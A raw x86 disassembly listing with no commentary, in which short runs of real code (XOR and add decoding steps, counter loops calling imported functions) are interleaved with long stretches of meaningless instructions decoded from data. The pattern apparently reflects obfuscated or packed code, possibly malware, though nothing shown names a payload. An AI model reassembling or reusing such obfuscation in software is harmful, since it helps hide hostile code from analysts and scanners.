  404c69:	imul   edi,DWORD PTR [edx],0x21
  404c6c:	mov    DWORD PTR [ebp-0x14],edx
  404c6f:	mov    edx,DWORD PTR [ebp-0xc]
  404c72:	mov    edi,DWORD PTR [ebp-0x24]
  404c75:	jmp    0x404dda
  404c7a:	or     al,BYTE PTR [ecx-0x1aa2d1be]
  404c80:	push   0xffffffbd
  404c82:	cmp    eax,ecx
  404c84:	dec    esi
  404c85:	shl    DWORD PTR [esi+ebp*2-0x78],0x86
  404c8a:	(bad)  
  404c8b:	adc    eax,0x7f347c7c
  404c90:	jl     0x404d0e
  404c92:	push   ebp
  404c93:	dec    eax
  404c94:	pop    eax
  404c95:	add    al,0x11
  404c97:	ror    DWORD PTR fs:[esi],1
  404c9a:	sbb    esp,DWORD PTR [ebp-0x77]
  404c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c9e:	imul   esi,DWORD PTR [eax-0x6b],0xfffffff8
  404ca2:	adc    DWORD PTR [edx+0x5c050435],ebp
  404ca8:	or     eax,0x9d8cd6f4
  404cad:	(bad)  
  404cae:	fcomp  QWORD PTR [edi+ebx*8+0x5098bb57]
  404cb5:	mov    bh,0xb5
  404cb7:	and    esi,ebx
  404cb9:	push   esp
  404cba:	pop    ecx
  404cbb:	or     al,0x7e
  404cbd:	test   BYTE PTR [esi],0x75
  404cc0:	xchg   BYTE PTR [edx],al
  404cc2:	sti    
  404cc3:	shl    DWORD PTR [ebp-0x46],0x59
  404cc7:	or     DWORD PTR [esi-0x23],esi
  404cca:	ds rol ecx,0x0
  404cce:	imul   ecx,DWORD PTR [edx+ecx*2-0x39],0x8018a94e
  404cd6:	mov    al,0xfe
  404cd8:	pop    esp
  404cd9:	dec    esi
  404cda:	and    al,0x49
  404cdc:	jmp    0x93b9:0x4b5c7545
  404ce3:	ja     0x404d29
  404ce5:	push   ecx
  404ce6:	dec    ecx
  404ce7:	cmc    
  404ce8:	cld    
  404ce9:	shl    BYTE PTR [ebp-0x62488aba],0xb0
  404cf0:	cmp    esi,ebp
  404cf2:	push   0x38
  404cf4:	dec    ebx
  404cf5:	push   0x4d
  404cf7:	ret    0x633c
  404cfa:	and    BYTE PTR [ecx+eiz*1+0x60206267],0xc
  404d02:	icebp  
  404d03:	popf   
  404d04:	fild   WORD PTR [ecx]
  404d06:	ror    eax,0x67
  404d09:	ds out 0x81,eax
  404d0c:	mov    dl,0x0
  404d0e:	dec    esp
  404d0f:	sbb    al,0xde
  404d11:	jns    0x404d89
  404d13:	popa   
  404d14:	sub    al,0x4a
  404d16:	or     BYTE PTR [edi],bh
  404d18:	jmp    0x2618:0x6777ce10
  404d1f:	mov    bl,dl
  404d21:	imul   DWORD PTR [ebp-0x3517b7ab]
  404d27:	xchg   edi,eax
  404d28:	push   es
  404d29:	add    BYTE PTR [esi+0xf5ee912],dl
  404d2f:	or     edx,esi
  404d31:	call   0x92cc:0xf1327e0e
  404d38:	sbb    DWORD PTR [edi+0x66],esp
  404d3b:	dec    ebx
  404d3c:	ins    DWORD PTR es:[edi],dx
  404d3d:	add    eax,DWORD PTR [edi-0x6901f2c4]
  404d43:	sbb    eax,0x2a24303
  404d48:	and    BYTE PTR [ebx-0x74],dl
  404d4b:	cli    
  404d4c:	or     al,0xa3
  404d4e:	pusha  
  404d4f:	pop    ss
  404d50:	push   0x16615722
  404d55:	and    eax,0xfb22cdc1
  404d5a:	addr16 je 0x404dd5
  404d5d:	mov    BYTE PTR [ebx-0x36c3bf47],ch
  404d63:	ins    BYTE PTR es:[edi],dx
  404d64:	pop    ebx
  404d65:	leavew 
  404d67:	fbstp  TBYTE PTR [ebp-0x26ec2ed2]
  404d6d:	(bad)  
  404d6f:	fdivr  st,st(5)
  404d71:	add    bl,0x40
  404d74:	jae    0x404d4a
  404d76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d77:	rol    bh,0x45
  404d7a:	mov    cl,0xef
  404d7c:	(bad)  [ecx-0x18]
  404d7f:	idiv   DWORD PTR [edx+ebx*8-0x7a]
  404d83:	fisttp QWORD PTR [esi+ebx*8]
  404d86:	pop    ebx
  404d87:	jno    0x404dc7
  404d89:	inc    ecx
  404d8a:	cmp    al,0xfe
  404d8c:	and    DWORD PTR [ecx-0x4eaf65ac],esi
  404d92:	outs   dx,BYTE PTR ds:[esi]
  404d93:	sub    eax,DWORD PTR [edi-0x8]
  404d96:	pop    edx
  404d97:	jb     0x404d19
  404d99:	fdecstp 
  404d9b:	enter  0x14,0x67
  404d9f:	adc    ebp,esi
  404da1:	dec    esi
  404da2:	mov    ds:0x1254decd,eax
  404da7:	mov    ebx,0x2ac2804a
  404dac:	out    dx,al
  404dad:	mov    ds:0xcb59e02f,al
  404db2:	vmwrite ebp,DWORD PTR [eax+0x3cca46a1]
  404db9:	out    0x11,eax
  404dbb:	ins    BYTE PTR es:[edi],dx
  404dbc:	xor    BYTE PTR [edi],ch
  404dbe:	test   DWORD PTR [esi],esi
  404dc0:	xchg   ebp,eax
  404dc1:	mov    cl,0xfb
  404dc3:	mov    edi,0xa42771c5
  404dc8:	js     0x404df5
  404dca:	test   BYTE PTR [eax-0x25],dl
  404dcd:	repnz dec esi
  404dcf:	out    dx,eax
  404dd0:	not    BYTE PTR [ebx+ebp*4-0x58666df6]
  404dd7:	cmp    ah,BYTE PTR [edi+0x3d0333e]
  404ddd:	ror    DWORD PTR [edi],1
  404ddf:	scas   eax,DWORD PTR es:[edi]
  404de0:	xlat   BYTE PTR ds:[ebx]
  404de1:	mov    edi,DWORD PTR [ebp-0xc]
  404de4:	xor    edi,eax
  404de6:	sub    edx,edi
  404de8:	mov    edi,DWORD PTR [ebp-0xc]
  404deb:	mov    ebx,DWORD PTR [ebp-0x14]
  404dee:	jmp    0x404f53
  404df3:	push   ebx
  404df4:	pop    ebx
  404df5:	inc    edx
  404df6:	cmp    DWORD PTR [edx-0x67],0x31957d53
  404dfd:	jb     0x404e2d
  404dff:	push   0xaeb7f685
  404e04:	adc    al,0x7c
  404e06:	jl     0x404e3c
  404e08:	jg     0x404e86
  404e0a:	jl     0x404dc5
  404e0c:	lock aad 0xfa
  404e0f:	mov    WORD PTR ss:[ebx-0x55],es
  404e13:	push   esp
  404e14:	sub    BYTE PTR [esi+0x791bb82b],cl
  404e1a:	xor    eax,0x332fe0a1
  404e1f:	std    
  404e20:	jae    0x404e13
  404e22:	lock loopne 0x404dd6
  404e25:	xchg   DWORD PTR [edi-0x38ad7bbd],edi
  404e2b:	jne    0x404e4c
  404e2d:	into   
  404e2e:	sbb    ax,0xe5e9
  404e32:	out    dx,eax
  404e33:	fcom   QWORD PTR [ebx-0xc]
  404e36:	or     bh,al
  404e38:	add    esi,DWORD PTR ds:0xa45c04a3
  404e3e:	outs   dx,BYTE PTR ds:[esi]
  404e3f:	inc    ebx
  404e40:	xchg   ecx,eax
  404e41:	or     DWORD PTR [edi],0xffffffc4
  404e44:	adc    eax,0xa47d8114
  404e49:	arpl   ax,cx
  404e4b:	ins    BYTE PTR es:[edi],dx
  404e4c:	jbe    0x404e1c
  404e4e:	lock sub BYTE PTR [edx-0x76],0xa6
  404e53:	push   ds
  404e54:	(bad)  
  404e55:	pop    ecx
  404e56:	ds addr16 call 0x6bd9:0x5bdc0025
  404e5f:	xchg   ebx,eax
  404e60:	and    al,0xdd
  404e62:	mov    esi,0x7d5ce710
  404e67:	or     BYTE PTR [edx-0x4c],dh
  404e6a:	mov    bl,bh
  404e6c:	mov    ebx,fs
  404e6e:	icebp  
  404e6f:	es jmp 0x404ede
  404e72:	push   eax
  404e73:	inc    esp
  404e74:	sahf   
  404e75:	cmp    eax,0xdb7cd420
  404e7a:	dec    ecx
  404e7b:	outs   dx,DWORD PTR ds:[esi]
  404e7c:	test   esi,edi
  404e7e:	xor    bh,dl
  404e80:	dec    esi
  404e81:	mul    DWORD PTR [edx]
  404e83:	sbb    dh,al
  404e85:	sahf   
  404e86:	mov    dl,0x36
  404e88:	push   cs
  404e89:	std    
  404e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e8b:	std    
  404e8c:	xor    DWORD PTR [edi-0x4a],0xa28db117
  404e93:	aaa    
  404e94:	jbe    0x404eae
  404e96:	xchg   esp,eax
  404e97:	pop    ds
  404e98:	xchg   ebp,eax
  404e99:	mov    ch,ah
  404e9b:	xor    eax,0x16703481
  404ea0:	test   DWORD PTR [esi],eax
  404ea2:	icebp  
  404ea3:	pop    ss
  404ea4:	cmp    ah,BYTE PTR [ebx+0x5f]
  404ea7:	(bad)  
  404ea8:	(bad)  
  404ea9:	mov    edx,0xa6ee8ea0
  404eae:	mov    ecx,0x3cd611e0
  404eb3:	popf   
  404eb4:	pop    edi
  404eb5:	jecxz  0x404ed0
  404eb7:	lock pusha 
  404eb9:	push   0xffffffd1
  404ebb:	test   al,0x29
  404ebd:	std    
  404ebe:	clc    
  404ebf:	cli    
  404ec0:	in     al,0xb3
  404ec2:	and    ah,al
  404ec4:	dec    edi
  404ec5:	sub    al,0x9f
  404ec7:	pop    esi
  404ec8:	fmul   QWORD PTR [esp+edi*8]
  404ecb:	mov    ebp,0x7ced223a
  404ed0:	sub    DWORD PTR [ebp+0x6a4271a4],0x2d
  404ed7:	push   esp
  404ed8:	jge    0x404e79
  404eda:	retf   0xc3fb
  404edd:	jg     0x404f19
  404edf:	sbb    al,0x92
  404ee1:	es mov al,0x9e
  404ee4:	in     al,0xc4
  404ee6:	or     DWORD PTR [ecx],esp
  404ee8:	xchg   DWORD PTR [edx],edi
  404eea:	jb     0x404f1e
  404eec:	cmp    al,0x71
  404eee:	out    0x13,eax
  404ef0:	xor    bh,BYTE PTR [ecx+0x116c94cc]
  404ef6:	xchg   ch,cl
  404ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ef9:	sbb    eax,0x778c72d
  404efe:	sbb    eax,0xc04249d8
  404f03:	sub    esp,esi
  404f05:	ins    DWORD PTR es:[edi],dx
  404f06:	or     bh,dh
  404f08:	or     BYTE PTR [ebx+eax*8+0x24],cl
  404f0c:	adc    al,0x2c
  404f0e:	mov    eax,ecx
  404f10:	or     BYTE PTR [edi],bh
  404f12:	scas   eax,DWORD PTR es:[edi]
  404f13:	jae    0x404ee2
  404f15:	fs cs pop ss
  404f18:	addr16 call 0xa1a9c870
  404f1e:	mov    al,0x33
  404f20:	dec    ecx
  404f21:	push   0x5a
  404f23:	adc    BYTE PTR [eax+0x232e737a],al
  404f29:	mov    BYTE PTR [ecx],cl
  404f2b:	rcr    DWORD PTR [ebx+0x33],1
  404f2e:	aad    0x21
  404f30:	mov    ebp,0xf81275c9
  404f35:	push   cs
  404f36:	cmp    BYTE PTR ds:0xe3a4b977,bh
  404f3c:	je     0x404f11
  404f3e:	dec    esp
  404f3f:	fldcw  WORD PTR [eax+0x1eeda0d8]
  404f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f46:	fwait
  404f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f48:	push   sp
  404f4a:	neg    edi
  404f4c:	fld    DWORD PTR [edi]
  404f4e:	popa   
  404f4f:	aad    0xdd
  404f51:	ja     0x404f51
  404f53:	xor    edi,eax
  404f55:	add    edi,ecx
  404f57:	imul   edi,ebx
  404f5a:	mov    ebx,DWORD PTR [ebp-0x18]
  404f5d:	xor    ebx,eax
  404f5f:	sub    edx,ecx
  404f61:	lea    edi,[edi+ebx*1+0x32729e]
  404f68:	cmp    edi,edx
  404f6a:	jbe    0x4047d5
  404f70:	mov    edx,DWORD PTR [ebp-0xc]
  404f73:	mov    edi,DWORD PTR [ebp-0x24]
  404f76:	xor    edx,eax
  404f78:	add    edx,ecx
  404f7a:	imul   edx,edi
  404f7d:	mov    edi,DWORD PTR [ebp-0x18]
  404f80:	xor    edi,eax
  404f82:	add    edx,edi
  404f84:	mov    edi,DWORD PTR [ebp-0x8]
  404f87:	lea    edx,[edx+edi*1+0x32729e]
  404f8e:	mov    DWORD PTR [ebp-0x8],edx
  404f91:	jmp    0x4050f6
  404f96:	jecxz  0x404f49
  404f98:	out    0xe3,eax
  404f9a:	jge    0x405019
  404f9c:	sti    
  404f9d:	mov    cl,0x66
  404f9f:	pop    edx
  404fa0:	cmp    BYTE PTR ds:0xbe48d9ad,cl
  404fa6:	popw   ss
  404fa8:	jl     0x405026
  404faa:	xor    al,0x7f
  404fac:	jl     0x40502a
  404fae:	pusha  
  404faf:	inc    ebx
  404fb0:	not    DWORD PTR [ebp-0x18]
  404fb3:	les    edi,FWORD PTR [eax+0x44]
  404fb6:	xchg   edi,eax
  404fb7:	ds aaa 
  404fb9:	test   BYTE PTR [edi-0x40efa090],dh
  404fbf:	adc    eax,0x526d9d8
  404fc4:	fisubr WORD PTR [ecx+ebp*2]
  404fc7:	pop    eax
  404fc8:	scas   eax,DWORD PTR es:[edi]
  404fc9:	fwait
  404fca:	retf   
  404fcb:	xchg   esp,eax
  404fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fcd:	mov    bh,0x7e
  404fcf:	loope  0x404f5e
  404fd1:	fidivr WORD PTR [edx+0x5887396c]
  404fd7:	xor    eax,0x7099caef
  404fdc:	mov    edi,0x53268a1a
  404fe1:	cmp    esp,DWORD PTR gs:[eax-0x3ecf8509]
  404fe8:	pop    ds
  404fe9:	mov    ebx,0x52c5633e
  404fee:	mov    esp,0x70148c27
  404ff3:	push   ebp
  404ff4:	neg    BYTE PTR [esi+0x3f]
  404ff7:	inc    ebx
  404ff8:	sti    
  404ff9:	out    dx,eax
  404ffa:	cs mov eax,0x8733965c
  405000:	sub    BYTE PTR [eax+0x6d7892ad],bl
  405006:	push   0x733f13e8
  40500b:	arpl   di,bp
  40500d:	ror    DWORD PTR [eax-0xa],1
  405010:	loop   0x404ff4
  405012:	stc    
  405013:	mov    DWORD PTR [esp+ebp*4-0x44],esi
  405017:	add    al,0x42
  405019:	ins    BYTE PTR es:[edi],dx
  40501a:	dec    esp
  40501b:	scas   eax,DWORD PTR es:[edi]
  40501c:	jo     0x40507e
  40501e:	pop    eax
  40501f:	scas   al,BYTE PTR es:[edi]
  405020:	adc    DWORD PTR [eax+0x3],esp
  405023:	ss sti 
  405025:	mov    edx,DWORD PTR [edx-0x28]
  405028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405029:	sbb    DWORD PTR [ebx],ecx
  40502b:	dec    esp
  40502c:	and    al,0xf1
  40502e:	xchg   edi,eax
  40502f:	xchg   esi,eax
  405030:	sbb    al,0xc
  405032:	xor    edi,eax
  405034:	and    al,0xa6
  405036:	push   ss
  405037:	pop    esi
  405038:	and    al,0x4
  40503a:	push   esp
  40503b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40503c:	in     al,dx
  40503d:	(bad)  
  40503e:	push   esp
  40503f:	inc    ebp
  405040:	pop    ss
  405041:	dec    esi
  405042:	hlt    
  405043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405044:	jnp    0x404fcd
  405046:	into   
  405047:	add    BYTE PTR [ebx-0x56],0xb7
  40504b:	shl    DWORD PTR [edi+0x52],1
  40504e:	out    0x49,al
  405050:	jp     0x404ff1
  405052:	mov    edi,0x92fa6338
  405057:	xlat   BYTE PTR ds:[ebx]
  405058:	arpl   WORD PTR [edx-0x74],dx
  40505b:	stos   BYTE PTR es:[edi],al
  40505c:	sub    edi,DWORD PTR [ecx]
  40505e:	pop    esi
  40505f:	shl    dl,cl
  405061:	and    DWORD PTR [edi-0x62],esi
  405064:	mov    dh,0x9d
  405066:	test   DWORD PTR [ebp-0x4aafe2e],eax
  40506c:	je     0x405054
  40506e:	outs   dx,BYTE PTR ds:[esi]
  40506f:	aam    0x4a
  405071:	ja     0x4050f1
  405073:	clc    
  405074:	jg     0x4050d7
  405076:	lods   al,BYTE PTR ds:[esi]
  405077:	add    BYTE PTR [esi-0x5b],al
  40507a:	sbb    al,0xfa
  40507c:	and    ebp,DWORD PTR [edi+ebx*4]
  40507f:	cmp    DWORD PTR [ebx],eax
  405081:	out    dx,al
  405082:	push   ss
  405083:	bound  esi,QWORD PTR [esi+eax*2]
  405086:	jmp    0xc33b:0xf0431d7c
  40508d:	int3   
  40508e:	rcl    BYTE PTR ds:0xec6bcf1e,1
  405094:	push   cs
  405095:	ja     0x405076
  405097:	pop    ecx
  405098:	jp     0x4050ee
  40509a:	hlt    
  40509b:	adc    al,0x5e
  40509d:	scas   eax,DWORD PTR es:[edi]
  40509e:	xor    al,BYTE PTR [ebx+0x17e62c43]
  4050a4:	addr16 adc eax,0xe7d3cab
  4050aa:	mov    bh,0x50
  4050ac:	fld    TBYTE PTR [ebx-0x53]
  4050af:	mov    cl,0x11
  4050b1:	mov    ch,BYTE PTR [edi]
  4050b3:	cdq    
  4050b4:	cmc    
  4050b5:	add    bl,BYTE PTR [ebx+0x3b]
  4050b8:	rcl    BYTE PTR [ebx-0x1e],cl
  4050bb:	(bad)  
  4050bc:	loopne 0x4050fc
  4050be:	cmp    ecx,DWORD PTR [edi]
  4050c0:	imul   edx,ecx,0xffffff99
  4050c3:	xchg   edi,eax
  4050c4:	(bad)  
  4050c5:	leave  
  4050c6:	fldl2t 
  4050c8:	jnp    0x405061
  4050ca:	adc    eax,0xd800f8a5
  4050cf:	js     0x405146
  4050d1:	or     BYTE PTR [ecx],dl
  4050d3:	pusha  
  4050d4:	mov    ebx,0xf1b2e615
  4050d9:	ins    BYTE PTR es:[edi],dx
  4050da:	js     0x4050b7
  4050dc:	push   ebx
  4050dd:	ja     0x405157
  4050df:	fsubrp st(5),st
  4050e1:	push   edi
  4050e2:	dec    ecx
  4050e3:	(bad)  
  4050e4:	jno    0x405112
  4050e6:	enter  0x4d2e,0x31
  4050ea:	xchg   DWORD PTR [ebp-0x4b7b78c0],ebp
  4050f0:	inc    eax
  4050f1:	jb     0x405075
  4050f3:	xchg   edx,eax
  4050f4:	hlt    
  4050f5:	pop    ds
  4050f6:	mov    edx,DWORD PTR [ebp-0x20]
  4050f9:	xor    edx,eax
  4050fb:	mov    edi,0xffcd8d62
  405100:	sub    edi,edx
  405102:	add    edi,DWORD PTR [ebp-0x10]
  405105:	mov    edx,DWORD PTR [ebp-0x20]
  405108:	mov    ebx,DWORD PTR [ebp-0x8]
  40510b:	xor    edx,eax
  40510d:	add    edx,ecx
  40510f:	imul   edx,ebx
  405112:	cmp    edx,edi
  405114:	jbe    0x4038c9
  40511a:	pop    ebx
  40511b:	pop    edi
  40511c:	leave  
  40511d:	ret    0x8
  405120:	push   ebp
  405121:	mov    ebp,esp
  405123:	push   ecx
  405124:	adc    DWORD PTR ds:0x4105cf,ebx
  40512a:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  405131:	and    DWORD PTR ds:0x43fbf8,0x0
  40513b:	jmp    0x40514d
  405140:	mov    edx,DWORD PTR ds:0x43fbf8
  405146:	inc    edx
  405147:	mov    DWORD PTR ds:0x43fbf8,edx
  40514d:	cmp    DWORD PTR ds:0x43fbf8,0x10
  405154:	jae    0x40518d
  40515a:	cmp    DWORD PTR ds:0x43fbf8,0x18
  405161:	jne    0x40517b
  405167:	push   DWORD PTR [ebp-0x10]
  40516a:	push   DWORD PTR [ebp-0x14]
  40516d:	push   0x4107b9
  405172:	push   DWORD PTR [ebp-0x10]
  405175:	call   DWORD PTR ds:0x43c4f0
  40517b:	jmp    0x405140
  405180:	movzx  edx,BYTE PTR ds:0x4427bc
  405187:	adc    DWORD PTR ds:0x413402,edx
  40518d:	mov    eax,DWORD PTR [ebp-0x4]
  405190:	adc    edx,ecx
  405192:	jmp    0x4052a5
  405197:	shr    DWORD PTR [ebp+0x4e7dfe7d],cl
  40519d:	sti    
  40519e:	ins    DWORD PTR es:[edi],dx
  40519f:	fs jne 0x40519a
  4051a2:	push   edi
  4051a3:	fld    DWORD PTR [eax+eax*4]
  4051a6:	leave  
  4051a7:	sub    DWORD PTR ds:[esp+edi*2+0x62],edi
  4051ac:	jl     0x40522a
  4051ae:	jl     0x405132
  4051b0:	(bad)  
  4051b2:	inc    ebp
  4051b3:	mov    eax,0x2c642f77
  4051b8:	int    0x73
  4051ba:	cmp    edx,DWORD PTR [eax-0x30a9375b]
  4051c0:	loop   0x4051bd
  4051c2:	cmp    dh,bl
  4051c4:	fld    TBYTE PTR [eax+0x56]
  4051c7:	or     DWORD PTR [ecx+0x5d],eax
  4051ca:	rol    DWORD PTR [edi+0x18479a3b],cl
  4051d0:	push   0x33d8213f
  4051d5:	xor    eax,0x1106d4f2
  4051da:	adc    BYTE PTR ds:0x29693d61,ah
  4051e0:	add    edx,edx
  4051e2:	xchg   edi,eax
  4051e3:	fsub   QWORD PTR es:[edx-0x549edabb]
  4051ea:	xor    ebx,esp
  4051ec:	mov    esp,DWORD PTR [edi+0x2f42d4f6]
  4051f2:	mov    DWORD PTR [eax+ebp*1-0x6992b69b],esp
  4051f9:	shl    edi,0xa5
  4051fc:	lea    esi,[edi+0x35e21997]
  405202:	add    eax,DWORD PTR [esi+0x7e]
  405205:	(bad)  
  405206:	ins    DWORD PTR es:[edi],dx
  405207:	and    edx,DWORD PTR [eax]
  405209:	bound  ecx,QWORD PTR [esi-0x78]
  40520c:	jp     0x405262
  40520e:	pop    esi
  40520f:	and    cl,BYTE PTR [edx+0x5a]
  405212:	ror    DWORD PTR fs:[ebx],cl
  405215:	mov    ebp,0x858030e3
  40521a:	cmp    al,0x39
  40521c:	add    bh,BYTE PTR [eax+0x44]
  40521f:	sahf   
  405220:	add    BYTE PTR [esi+0x31],0xd0
  405224:	jmp    0x4051d8
  405226:	sub    esi,DWORD PTR [eax-0x52]
  405229:	std    
  40522a:	fiadd  DWORD PTR [esi-0x5b]
  40522d:	aas    
  40522e:	jbe    0x4051e8
  405230:	popf   
  405231:	lock rcl esp,1
  405234:	jg     0x4051c3
  405236:	xchg   edi,eax
  405237:	fcmove st,st(2)
  405239:	cmp    BYTE PTR [ebx+ebp*1+0x694a5296],0x4e
  405241:	push   ecx
  405242:	xchg   ecx,eax
  405243:	mov    eax,0xe69cb2a6
  405248:	in     al,0x48
  40524a:	xor    dl,BYTE PTR [esi]
  40524c:	or     BYTE PTR [edi+0x330ea263],ch
  405252:	shl    BYTE PTR [ebx+0x6a35731f],1
  405258:	out    dx,eax
  405259:	jmp    0x7711c095
  40525e:	fstp   QWORD PTR gs:[esi+0x488e14aa]
  405265:	xor    eax,0xcd805db
  40526a:	push   cs
  40526b:	pop    edx
  40526c:	adc    BYTE PTR [esi],ch
  40526e:	out    0x4f,eax
  405270:	push   esi
  405271:	jmp    0x4052d7
  405273:	ficom  DWORD PTR [edx+esi*2+0x3f]
  405277:	mov    ecx,DWORD PTR [esi-0x1b12a83f]
  40527d:	out    dx,al
  40527e:	adc    al,BYTE PTR [eax]
  405280:	jo     0x405223
  405282:	test   eax,0xcd03f8a5
  405287:	jle    0x4052f7
  405289:	and    eax,0xa35ff4e6
  40528e:	adc    cl,BYTE PTR [edi]
  405290:	in     al,dx
  405291:	jbe    0x405304
  405293:	sub    bl,BYTE PTR [ebx+0x7c5e97ad]
  405299:	push   es
  40529a:	scas   eax,DWORD PTR es:[edi]
  40529b:	pop    esp
  40529c:	cmp    al,0x9d
  40529e:	or     dh,al
  4052a0:	pop    esp
  4052a1:	lahf   
  4052a2:	xor    bh,bh
  4052a4:	cmp    DWORD PTR [ebx+0xee91055],ecx
  4052aa:	add    DWORD PTR [eax],eax
  4052ac:	add    cl,al
  4052ae:	icebp  
  4052af:	in     al,0x97
  4052b1:	fs jns 0x4052f5
  4052b4:	jns    0x4052eb
  4052b6:	adc    al,0x56
  4052b8:	jne    0x405328
  4052ba:	jo     0x4052c0
  4052bc:	int    0x24
  4052be:	sub    BYTE PTR [esp+edi*2+0x62],bh
  4052c2:	jl     0x405340
  4052c4:	jl     0x4052cb
  4052c6:	mov    es,WORD PTR [esi+eax*8-0x366836aa]
  4052cd:	ins    BYTE PTR es:[edi],dx
  4052ce:	mov    BYTE PTR [esi-0x59],dl
  4052d1:	(bad)  
  4052d2:	rol    BYTE PTR [ebp+esi*8-0x72],0xb
  4052d7:	fist   WORD PTR [ecx-0x65]
  4052da:	push   esp
  4052db:	push   es
  4052dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052dd:	jge    0x40534f
  4052df:	dec    BYTE PTR [ebx-0x35]
  4052e2:	int3   
  4052e3:	lods   al,BYTE PTR ds:[esi]
  4052e4:	jg     0x405297
  4052e6:	jne    0x4052fa
  4052e8:	xchg   ecx,eax
  4052e9:	add    al,0x27
  4052eb:	mov    al,0x20
  4052ed:	sub    dh,BYTE PTR [edx-0x1f]
  4052f0:	mov    WORD PTR [edi],gs
  4052f2:	jge    0x405287
  4052f4:	pop    ebp
  4052f5:	retf   
  4052f6:	mov    ebp,ebp
  4052f8:	(bad)  
  4052f9:	call   0xe51:0x597dd3e2
  405300:	fs push eax
  405302:	xchg   DWORD PTR [edi+0x3a00928e],eax
  405308:	xchg   esi,eax
  405309:	jmp    0x1851f0c7
  40530e:	addr16 cmp eax,0xe31d8dfe
  405314:	stos   BYTE PTR es:[edi],al
  405315:	dec    edx
  405316:	xor    esi,DWORD PTR [ebx-0xff42663]
  40531c:	jmp    0xcc6b:0xed0bb50a
  405323:	cmp    BYTE PTR [ebx+0x28701a70],ah
  405329:	retf   
  40532a:	frstor es:[esi]
  40532d:	imul   ebx,DWORD PTR [ebx+0x739ef8b8],0x27
  405334:	inc    ebp
  405335:	rcl    BYTE PTR [edi+0x5c],1
  405338:	xchg   esp,eax
  405339:	cmp    dh,bh
  40533b:	xlat   BYTE PTR ds:[ebx]
  40533c:	sbb    al,0x47
  40533e:	sbb    cl,bh
  405340:	push   esp
  405341:	sbb    eax,0x2d8de93f
  405346:	jge    0x40538f
  405348:	pop    eax
  405349:	inc    ebx
  40534a:	(bad)  
  40534b:	jnp    0x40538b
  40534d:	unpcklps xmm3,xmm7
  405350:	jge    0x4053a6
  405352:	int3   
  405353:	jno    0x405363
  405355:	sbb    ebx,ebx
  405357:	and    cl,cl
  405359:	pop    ebp
  40535a:	dec    esp
  40535b:	cmp    DWORD PTR [edx+ebx*4],0x94ddc602
  405362:	es bswap eax
  405365:	repz mov eax,ds:0xce5c1ca9
  40536b:	(bad)  
  40536c:	sbb    BYTE PTR [esi+ecx*8-0x56],0xc0
  405371:	js     0x405315
  405373:	popf   
  405374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405375:	mov    esi,DWORD PTR [ecx-0x59]
  405378:	fcmovne st,st(3)
  40537a:	(bad)  
  40537b:	fmul   QWORD PTR [ecx+0x1c8113ae]
  405381:	out    dx,eax
  405382:	cmp    BYTE PTR [ebx],ch
  405384:	pushf  
  405385:	adc    ebp,ebx
  405387:	fistp  WORD PTR [eax+edx*8-0x44]
  40538b:	movntq QWORD PTR [eax],mm6
  40538e:	lea    edx,[eax]
  405390:	cmp    ecx,DWORD PTR [edi]
  405392:	repnz adc BYTE PTR ss:[ecx-0x7e],dl
  405397:	frstor [eax+edi*2-0x6e47445a]
  40539e:	jnp    0x4053d3
  4053a0:	jo     0x4053c4
  4053a2:	jno    0x405351
  4053a4:	xchg   ecx,eax
  4053a5:	mov    ?,WORD PTR [esi+0x43d29189]
  4053ab:	mov    ss,ecx
  4053ad:	mov    ebx,0x57a67379
  4053b2:	jae    0x40536a
  4053b4:	mov    edi,eax
  4053b6:	mov    ecx,edx
  4053b8:	(bad)  
  4053b9:	scas   eax,DWORD PTR es:[edi]
  4053ba:	add    eax,0x510857b9
  4053bf:	pop    es
  4053c0:	xor    DWORD PTR ds:0x41340a,0x5c99
  4053ca:	xor    eax,ecx
  4053cc:	add    eax,0x32729e
  4053d1:	sub    DWORD PTR ds:0x413416,0x4105cb
  4053db:	mov    DWORD PTR [edx],eax
  4053dd:	mov    eax,DWORD PTR [ebp+0xc]
  4053e0:	xor    eax,ecx
  4053e2:	push   esi
  4053e3:	add    DWORD PTR ds:0x4427bc,0x2efc
  4053ed:	mov    esi,DWORD PTR [ebp+0x10]
  4053f0:	mov    edx,0x32729e
  4053f5:	sub    DWORD PTR ds:0x445380,0x7c97
  4053ff:	add    eax,edx
  405401:	xor    DWORD PTR ds:0x445380,0x4427b4
  40540b:	mov    DWORD PTR [esi+0x4],eax
  40540e:	mov    DWORD PTR ds:0x44537c,0x1d
  405418:	cmp    DWORD PTR ds:0x44537c,0x0
  40541f:	je     0x405452
  405425:	cmp    DWORD PTR ds:0x44537c,0x21
  40542c:	jne    0x405442
  405432:	push   0x410650
  405437:	push   0x400000
  40543c:	call   DWORD PTR ds:0x43c5bc
  405442:	mov    eax,ds:0x44537c
  405447:	dec    eax
  405448:	mov    ds:0x44537c,eax
  40544d:	jmp    0x405418
  405452:	mov    eax,DWORD PTR [ebp+0x14]
  405455:	mov    esi,DWORD PTR [ebp+0x10]
  405458:	mov    DWORD PTR [esi+0x8],eax
  40545b:	mov    eax,DWORD PTR [ebp+0x18]
  40545e:	mov    esi,DWORD PTR [ebp+0x10]
  405461:	mov    DWORD PTR [esi+0xc],eax
  405464:	mov    eax,DWORD PTR [ebp+0x1c]
  405467:	mov    esi,DWORD PTR [ebp+0x10]
  40546a:	mov    DWORD PTR [esi+0x10],eax
  40546d:	mov    eax,eax
  40546f:	mov    eax,DWORD PTR [ebp+0x8]
  405472:	xor    eax,ecx
  405474:	add    eax,edx
  405476:	pop    esi
  405477:	leave  
  405478:	ret    0x18
  40547b:	push   ebp
  40547c:	mov    ebp,esp
  40547e:	mov    eax,DWORD PTR [ebp+0xc]
  405481:	xor    edx,edx
  405483:	mov    ecx,0x7264fcad
  405488:	jmp    0x40559b
